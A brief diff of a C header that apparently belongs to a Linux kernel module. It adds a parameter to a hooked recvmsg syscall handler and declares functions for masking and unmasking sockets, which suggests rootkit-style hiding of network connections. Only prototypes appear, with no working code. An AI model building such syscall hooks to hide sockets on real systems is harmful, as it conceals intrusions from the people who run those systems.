@@ -29,7 +29,7 @@
 int socket_masking_init(int);
 int socket_masking_exit(void);
 
-asmlinkage ssize_t socket_masking_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
+asmlinkage ssize_t socket_masking_recvmsg_syscall(int, struct user_msghdr __user *, unsigned, ssize_t);
 
 int mask_socket(char *, int);
 int unmask_socket(char *, int);
